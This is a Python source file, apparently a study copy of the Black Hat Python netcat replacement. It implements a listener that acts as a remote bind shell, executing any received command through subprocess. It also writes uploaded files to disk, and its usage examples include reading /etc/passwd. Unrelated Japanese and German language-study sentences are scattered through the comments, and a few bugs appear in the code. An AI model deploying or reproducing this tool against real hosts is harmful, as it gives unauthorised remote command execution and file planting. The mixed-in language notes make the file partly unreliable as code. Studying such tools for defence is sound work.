################################################################
################################################################
################################################################
################################################################
import shlex
import subprocess as subprocs
################################################################
################################################################
################################################################
################################################################
################################################################
################################################################
###############################################################_
def execute( cmd ):
    # discard trailing white spaces
    cmd = cmd.strip()
    # ignore empty commands
    if not cmd: return
    # get command vector
    argv = shlex.split( cmd )
    # execute in a sub process
    out = subprocs.check_output( argv )
    # au revoir
    return out.decode()
################################################################
import os
import argparse
import textwrap
################################################################
def conspasa():
    prog = os.path.basename( __file__ )
    pasa = argparse.ArgumentParser(
        description='BHP netcat Swiss Knife',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent( f'''Examples:
    {prog} -t 192.168.1.108 -p 5555 -l -c # command shell
    {prog} -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
    {prog} -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
    echo 'ABC' | {prog} -t 192.168.1.108 -p 135 # echo text to server port 135
    {prog} -t 192.168.1.108 -p 5555 # connect to server
        ''' ))
    pasa.add_argument( '-c', '--command', action='store_true', help='command shell' )
    pasa.add_argument( '-e', '--execute', help='execute specified command' )
    pasa.add_argument( '-l', '--listen', action='store_true', help='listen' )
    pasa.add_argument( '-p', '--port', type=int, default=5555, help='specified port' )
    pasa.add_argument( '-t', '--target', default='192.168.1.203', help='specified IP' )
    pasa.add_argument( '-u', '--upload', help='upload file' )
    return pasa
################################################################
################################################################
################################################################
################################################################
from socket import ( socket,
                     AF_INET, SOCK_STREAM,
                     SOL_SOCKET, SO_REUSEADDR )
import threading # imbortant import!
################################################################
#       |  
#_______|_______________________________________________________
# 日曜日に行きます。
#_______|_______________________________________________________
# 十時四十五分に起きます。
#_______|_______________________________________________________
#       | 九月に帰ります。
#_______|_______________________________________________________
#       |                              あした来ます。
#_______|_______________________________________________________
#       | 
#_______|_______________________________________________________
################################################################
################################################################
################################################################
################################################################
class NetCat:
    ############################################################
    def __init__( self, args, buffer=None ): ###################
        self.args = args
        self.buffer = buffer
        self.socket = socket( AF_INET, SOCK_STREAM )
        self.socket.setsockopt( SOL_SOCKET, SO_REUSEADDR, 1 )
    ############################################################
    def run( self ): ###########################################
        if( self.args.listen ): self.listen()
        else: self.send()
    ############################################################
    def get_response( sock ):###################################
        """ refactor that recv code block """
        BUFRSIZ = 4096
        response = b''
        while True:
            data = sock.recv( BUFRSIZ )
            response += data
            if len( data ) < BUFRSIZ: break
        return response
    ############################################################
    def server( self ): ########################################
        return self.args.target, self.args.port
    ############################################################
    def send( self ):###########################################
        # shortcuts
        sock = self.socket
        bufr = self.buffer
        # I'm gonna get my self, I'm gonna get my self, I'm gonn
        sock.connect( self.server())
        # don't create unnecessary network traffic
        if bufr: sock.send( bufr )
        try:
            while True: #
                response = NetCat.get_response( sock )          ####
                if response:                                    ####
                    print( response.decode())                   ####
                    bufr = input( "> " ) + "\n"                 ####
                    sock.send( bufr.encode())
                else:
                    print( "Server has closed the connection" )
                    break
        except KeyboardInterupt: # Ctrl-C
            print( 'User terminated' )
        finally:
            sock.close()
            sys.exit()
    ############################################################    
    def listen( ish ): #########################################
        sock = ish.socket
        #
        server = ish.server()
        sock.bind( server )
        BACKLOG = 10
        sock.listen( BACKLOG )
        print( f"Server {server[ 0 ]} listening on port" + 
               f" {server[ 1 ]} .." )
        #
        while True:
            client_sock, client_addr = sock.accept()
            print( f"A new connection from {client_addr}" )
            thd = threading.Thread( target=ish.handle_client,
                                    args=( client_sock, ))
            thd.start()
    ############################################################
    def handle_client( self, client_sock ): ####################
        #
        com = self.args.execute
        if com:
            output = execute( com )
            client_sock.send( output.encode())
        #
        filename = self.args.upload
        if filename:
            with open( filename, 'wb' ) as f:
                f.write( NetCat.get_response( client_sock ))
            client_sock.send( f"Saved to {filename}\n".encode())
        #
        shell = self.args.command
        if shell:
            while True:
                try:
                    client_sock.send( b">> " )
                    bufr = b''
                    while b'\n' not in bufr:
                        bufr += client_sock.recv( 64 )
                    output = execute( bufr.decode())
                    client_sock.send( output.encode())
                except Exception as e:
                    print( f"SEGMENTATION FAULT: {e}" )
                    self.socket.close()
                    sys.exit()
        client_sock.close()
################################################################
################################################################
################################################################
################################################################
################################################################
################################################################
import sys
################################################################
if __name__ == '__main__':
    pasa = conspasa()
    args = pasa.parse_args()
    bufr = ''
    if not args.listen: bufr = sys.stdin.read()
    nc = NetCat( args, bufr.encode())
    nc.run()
################################################################
################################################################
################################################################
################################################################
# 1 うちで音楽を聞きます。
#   Ich höre zu Hause Musik.
# 2 学校でテニスをじます。
#   Ich spiele Tenis in der Schule.
# 3 マクドナルドでハンバーガーを食べます。 
#   Ich esse eine Hamburger bei McDonald's.
# 4 喫茶店でコーヒーを飲みます。 
#   Ich trinke Kaffee im Café. 
# 5 うちでテレビを見ます。
#   Ich sehe zu Hause fern. 
# 6 大学で日本語を話します。 
#   Ich spreche Japanisch an der Universität. 
################################################################
################################################################
################################################################
################################################################
